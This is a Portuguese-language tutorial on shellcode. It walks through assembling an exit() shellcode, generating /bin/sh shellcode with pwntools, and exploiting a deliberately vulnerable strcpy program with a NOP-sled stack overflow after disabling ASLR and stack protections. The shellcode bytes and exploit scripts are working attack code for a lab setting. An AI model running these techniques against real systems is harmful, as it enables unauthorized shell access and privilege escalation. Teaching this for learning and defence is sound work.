# Shellcode

Agora que sabemos um método de mudar o fluxo de execução do programa, seria interessante conseguirmos injetar um código arbitrário no programa para executar comandos que o programa original não conseguiria fazer, mas que são interessantes para nós. É aí que entra o **shellcode**.

Shellcode nada mais é do que um pedaço de código que usamos como payload, ou seja, dados a serem transmitidos, durante a exploração de uma vunerabilidade com o propósito de ser executado.

É chamado de shellcode por normalmente envolver a abertura de uma _shell_ durante a execução, mas não é necessariamente limitado a isso. Mas o que seria uma shell?

Shell é uma interface entre o usuário e os serviços de um sistema operacional. Elas podem usar uma interface gráfica do usuário (GUI), como o _Windows shell_ (que possui o Menu Iniciar, a Barra de Tarefas e diversas outras funcionalidades), ou podem usar uma interface de linha de comando (CLI), como o _bash_, o _sh_, o _zsh_, entre outros que você pode usar a partir de seu _Terminal_ ou _Prompt de Comando_. É mais comum se referir a shells de linha de comando como _shell_ do que as de interface gráfica, especialmente quando estamos falando de shellcode.

Esse tipo clássico de shellcode, que envolve abrir uma shell, é interessante quando há um programa rodando em uma porta de uma máquina na rede que você pode interagir ou quando esse programa possui permissões maiores que a do seu usuário atual, pois ao abrir uma shell com seu shellcode, você terá acesso à maquina com possivelmente as mesmas permissões desse tal programa. Portanto você pode conseguir acesso a uma máquina ou realizar uma escalada de privilégios.

Vamos tentar fazer um shellcode simples para entender como ele funciona.

Primeiro, vamos fazer um programa em C para testar se um shellcode funciona. O programa será o seguinte:

```c
void (*shellcode)() = "[insira seu shellcode aqui]";

int main(void) {
    (*shellcode)();
    return 0;
}
```

Ele será compilado com as flags do gcc `-z execstack` e `-Wno-incompatible-pointer-types`, podendo ser adicionado o `-m32` para testar shellcodes em 32-bits.

```
gcc testador.c -o testador -z execstack -Wno-incompatible-pointer-types -m32
```

Agora que temos o testador, vamos tentar escrever um programa simples em assembly que simula a função `exit()` em C com o parâmetro `10` e salvaremos como `exit.asm`.

```asm
    section .text     ; Define que essa região do código é para as instruções

    global _start     ; Define que o programa começa por _start

_start:
    mov eax, 1        ; eax ( código da syscall ) = 1 ( exit )
    mov ebx, 10       ; ebx ( parâmetro da syscall ) = 10
    int 0x80          ; Chama a syscall ( exit(10) )
```

Para montarmos esse programa, usaremos o `nasm` e para linkar o objeto montado pelo nasm, usaremos o `ld`.

```
nasm -f elf32 exit.asm -o exit.o
ld -m elf_i386 exit.o -o exit
```

Podemos executá-lo com `./exit` e ver a código de saída do programa com `echo $?`. Assim, vemos que o nosso programa está funcionando como deveria.

Para pegarmos os bytes desse programa, podemos usar o objdump.

Digitando `objdump -D exit`:

```

exit:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       b8 01 00 00 00          mov    $0x1,%eax
 8049005:       bb 0a 00 00 00          mov    $0xa,%ebx
 804900a:       cd 80                   int    $0x80
```

Portanto, os bytes do programa são:

```
b8 01 00 00 00
bb 0a 00 00 00
cd 80
```

Colocando eles em nosso testador:

```c
void (*shellcode)() = "\xb8\x01\x00\x00\x00\xbb\x0a\x00\x00\x00\xcd\x80";

int main(void) {
    (*shellcode)();
    return 0;
}
```

Compilando e checando o código de saída:

```bash
gcc testador.c -o testador -z execstack -Wno-incompatible-pointer-types -m32
./testador
echo $?
```

Podemos ver que o código de saída é 10, como esperado.

Agora que temos uma ideia do que é shellcode, vamos testar um shellcode que abre uma shell.

O pwntools possui uma ferramenta chamada `shellcraft` que cria um shellcode. O shellcode dado vai estar em assembly e podemos transformar em bytes usando a ferramenta `asm()`.

Testando no interpretador python:

```
>>> from pwn import *
>>> context.arch = 'i386'
>>> context.bits = 32
>>> asm(shellcraft.sh())
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

No caso, o shellcode acima será para sistemas em 32-bits pois definimos `context.arch` como `i386` e `context.bits` como `32`.

Podemos criar um para sistemas 64-bits definindo `context.arch` como `amd64` e `context.bits` como `64`:

```
>>> from pwn import *
>>> context.arch = 'amd64'
>>> context.bits = 64
>>> asm(shellcraft.sh())
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
```

Se quisermos ver o número de bytes que esse shellcode ocupa, podemos usar `len(asm(shellcraft.sh()))`.

Podemos ver que o tamanho do shellcode de 32-bits é 44 bytes e o tamanho do de 64-bits é 48 bytes. Há shellcodes menores que esses pela internet, então se o espaço que você tiver para escrever o shellcode for menor que isso, você pode procurar por um desses ou fazer o seu próprio.

Se copiarmos esses bytes para nosso testador, não irá funcionar, pois do jeito que está apresentado nessa string de bytes, conjunto de bytes como "\x814", que deveria ser interpretado como o caractere "\x81" + o caractere "4" será interpretado pelo compilador em C como caracteres cujos hexadecimais são "\x814". Para contornar esse problema, podemos separá-los em várias strings, por exemplo, transformando `"\x01\x01\x814$\x01\x01\x01"` em `"\x01\x01\x81" "4$\x01\x01\x01"`. Dessa forma, no nosso testador, o shellcode para 32-bits fica:

```c
void (*shellcode)() = "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x81""4$ri\x01\x01""1\xc9Qj\x04Y\x01\xe1Q\x89\xe1""1\xd2j\x0bX\xcd\x80";

int main(void) {
    (*shellcode)();
    return 0;
}
```

Compilando novamente com `gcc testador.c -o testador -z execstack -m32 -Wno-incompatible-pointer-types` e executando, podemos ver que conseguimos uma shell `sh`. Podemos testar alguns comandos como o `ls` ou sair dessa shell com Ctrl+D.

Agora vamos juntar o buffer overflow com o shellcode. Para isso, vamos criar um programa com um buffer overflow. O programa será o seguinte:

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buffer[8];

    strcpy(buffer, argv[1]);

    return 0;
}
```

Nesse caso, usaremos o `strcpy()` para não termos que nos preocupar com o caso de o shellcode ter um espaço ou um '\n' no meio e o scanf() parar de ler. Caso fossemos lidar com o `scanf()`, teriamos que fazer um shellcode que não possua esses caracteres no meio. O strcpy() para apenas no '\0', então só precisamos garantir que não há bytes nulos no shellcode.

Compilaremos esse programa da seguinte forma:

```
gcc shellcode.c -o shellcode -z execstack -fno-stack-protector -m32 -mpreferred-stack-boundary=2 -no-pie
```

Podemos verificar se está tudo correto usando o checksec do pwntools pelo seguinte comando:

```
checksec shellcode
```

Se aparecer a seguinte mensagem com o NX disabled, está tudo certo:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Caso apareça essa outra mensagem com o NX enabled:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Você precisará usar o `execstack` para removê-lo, caso contrário, não poderemos executar a stack.

```
execstack -s shellcode
```

Abrindo no gdb, vemos que a organização da stack na main está da seguinte forma:

```
Dump of assembler code for function main:
   0x08049196 <+0>:     endbr32
   0x0804919a <+4>:     push   ebp
   0x0804919b <+5>:     mov    ebp,esp
   0x0804919d <+7>:     push   ebx
   0x0804919e <+8>:     sub    esp,0x8
   [...]
   0x080491b4 <+30>:    lea    edx,[ebp-0xc]
   [...]
```

Portanto temos 4 bytes do ebp + 4 bytes do ebx + 8 bytes do stack frame, que no caso é só composto pelo nosso buffer, até começarmos a sobreescrever o endereço de retorno. Nosso shellcode será colocado após o endereço de retorno, já que não há espaço no buffer e também porque tem grandes chances de um push do shellcode acabar sobrescrevendo partes do próprio shellcode se colocado antes do endereço de retorno, que será o topo da stack na execução do shellcode.

A próxima coisa que faremos é pegar o endereço da stack, para sabermos onde começará o shellcode.

Podemos dar `break main` no gdb para que a stack esteja num ponto que há apenas o endereço de retorno na stack e assim, o endereço em que colocaremos nosso shellcode será `esp + 4`. Como estamos usando o argumento da main para escrever o shellcode e esse argumento será colocado na stack pois é um argumento de função, se colocarmos um argumento de tamanho diferente de nosso payload final, o endereço que pegarmos da stack não será o mesmo de quando executarmos nosso payload. Por isso, vamos colocar um argumento que simule os 16 bytes de padding, mais 4 do endereço de retorno e mais 44 bytes do nosso shellcode, totalizando 64 bytes.

Podemos usar o `$()` para colocar um comando no lugar do argumento e podemos usar o Python com a flag `-c` para que ele execute o que estiver entre aspas.

```
break main
run $(python3 -c "print('A' * 64)")
```

Para esse exemplo, o endereço que estará o shellcode será 0xffffd390, mas ele varia de terminal para terminal por causa das variáveis de ambiente que são colocadas antes da stack.

Sairemos do gdb e abriremos o Python 3 para começar nosso exploit. Nosso payload será 16 bytes aleatórios para chegarmos no endereço de retorno, mais 4 bytes do endereço de retorno e depois nosso shellcode.

Escreveremos o seguinte script:

```=python
from pwn import *

# Faz o buffer overflow
payload = b'A' * 16              # Padding
payload += p32(0xffffd390)       # Endereço de retorno

# Adiciona o shellcode
context.arch = 'i386'            # Arquitetura i386
context.bits = 32                # 32-bits
payload += asm(shellcraft.sh())  # Concatena o shellcode

# Escreve em um arquivo
f = open('exploit.txt', 'wb')    # Abre um arquivo para escrita
f.write(payload)                 # Escreve o payload nesse arquivo
f.close()                        # Fecha o arquivo
```

Se formos para o gdb e executarmos o programa com nosso arquivo de payload como argumento:

```
run $(cat exploit.txt)
```

Podemos ver que ele abrirá uma shell `sh`.

Porém, uma shell no GDB não pode te dar permissões a mais e será uma execução local, então temos que ver se o exploit funciona também no programa de verdade.

Se tentarmos executar no programa original:

```
./shellcode $(cat exploit.txt)
```

Muito provavelmente irá causar um segmentation fault sem abrir a shell. Um motivo disso é que as variáveis de ambiente dentro e fora do GDB são diferentes e por isso, a stack não estará exatamente no mesmo lugar. Outro motivo é que o ASLR provavelmente deve estar habilitado na máquina. Veremos mais para frente, mas em resumo, por causa do ASLR, a stack pode ser colocada em um lugar diferente a cada execução.

Há diversas formas de contornar isso. Podemos desabilitar o ASLR usando `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` e usar uma ferramenta chamada NOP sled.

NOP é uma instrução que não faz nada e em binário, ela é equivalente ao byte 0x90. Quando você junta vários desses NOPs, você forma um NOP sled. Esse NOP sled pode ser colocado antes do shellcode para que ele vá executando esse "nada" até chegar ao shellcode, permitindo assim uma maior margem de erro.

Vamos desabilitar o ASLR e adicionar um NOP sled de 1000 bytes ao nosso exploit. Para isso, teremos que pegar o novo endereço da stack, baseado em um argumento de 64+1000 bytes. Então abrimos o GDB e executamos novamente os seguintes comandos:

```
break main
run $(python3 -c "print('A' * 1064)")
print $esp+0x4
```

Agora com o novo endereço, que nesse exemplo é 0xffffcf90, modificamos nosso script em Python para o novo endereço e colocamos um NOP sled de 1000 bytes logo antes do shellcode. Também usaremos o endereço que pegamos somado com aproximadamente metade do NOP sled, para caso o começo do NOP sled no GDB esteja antes do começo do NOP sled na stack real. Caso não esteja, ainda é muito provável que mesmo somando metade, ainda acertaremos o NOP sled.

```=python
#!/usr/bin/env python3

from pwn import *

# Faz o buffer overflow
payload = b'A' * 16              # Padding
payload += p32(0xffffcf90+0x200) # Endereço de retorno + aproximadamente metade do NOP sled

# Adiciona o shellcode
context.arch = 'i386'            # Arquitetura i386
context.bits = 32                # 32-bits
payload += b'\x90' * 1000        # Adiciona o NOP sled
payload += asm(shellcraft.sh())  # Concatena o shellcode

# Escreve em um arquivo
f = open('exploit.txt', 'wb')    # Abre um arquivo para escrita
f.write(payload)                 # Escreve o payload nesse arquivo
f.close()                        # Fecha o arquivo
```

Testando no programa original:

```
./shellcode $(cat exploit.txt)
```

Provavelmente você conseguiu uma shell. Se testar no GDB, ele deve funcionar também. Caso não tenha conseguido, tente aumentar o tamanho do NOP sled e/ou mudar o offset em relação ao endereço original, que nesse caso foi usado 0x200 (aproximadamente metade do NOP sled).
